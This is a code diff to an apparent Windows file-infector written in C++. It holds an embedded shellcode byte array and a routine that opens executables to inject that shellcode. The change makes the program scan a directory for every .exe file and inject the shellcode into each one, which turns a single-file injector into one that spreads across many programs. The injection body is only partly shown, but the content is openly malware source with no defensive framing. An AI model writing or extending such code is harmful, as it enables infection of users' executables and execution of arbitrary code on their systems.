@@ -1,6 +1,7 @@
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
+#include <vector>
 
 BYTE shellcode[] = {
     "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
@@ -34,8 +35,8 @@ void printErrorMessage(const std::string& message) {
     std::cerr << message << std::endl;
 }
 
-bool readAndInjectShellcode(const wchar_t* filePath) {
-    HANDLE fileHandle = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+bool readAndInjectShellcode(const std::wstring& filePath) {
+    HANDLE fileHandle = CreateFile(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (fileHandle == INVALID_HANDLE_VALUE) {
         printErrorMessage("Failed to open file");
         return false;
@@ -141,14 +142,43 @@ bool readAndInjectShellcode(const wchar_t* filePath) {
     return true;
 }
 
-int main() {
-    const wchar_t* filePath = L"C:\\Users\\Avenger\\Desktop\\DXCpl - Copy.exe";
+// Checking through the directory to find and affect all PE files in it
+std::vector<std::wstring> findPEFilesInDirectory(const std::wstring& directory) {
+	std::vector<std::wstring> peFiles;
+	WIN32_FIND_DATA findFileData;
+	HANDLE hFind = FindFirstFile((directory + L"\\*").c_str(), &findFileData);
 
-    if (readAndInjectShellcode(filePath)) {
-        std::cout << "Shellcode injected successfully" << std::endl;
-        return 0;
-    }
-    else {
-        return 1;
-    }
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+				std::wstring fileName = findFileData.cFileName;
+				if (fileName.length() > 4 && fileName.substr(fileName.length() - 4) == L".exe") {
+					peFiles.push_back(directory + L"\\" + fileName);
+				}
+			}
+		} while (FindNextFile(hFind, &findFileData) != 0);
+		FindClose(hFind);
+	}
+	return peFiles;
+}
+
+int main() {
+	const std::wstring directory = L"C:\\Users\\Avenger\\Desktop\\Test";
+	
+	std::vector<std::wstring> peFiles = findPEFilesInDirectory(directory);
+	if (peFiles.empty()) {
+		printErrorMessage("No PE files found in directory");
+		return 1;
+	}
+	
+	for (const auto& filePath : peFiles) {
+		if (readAndInjectShellcode(filePath)) {
+			std::wcout << L"Shellcode injected successfully into: " << filePath << std::endl;
+		}
+		else {
+			printErrorMessage("Failed to inject shellcode into: " + std::string(filePath.begin(), filePath.end()));
+		}
+	}
+	
+	return 0;
 }
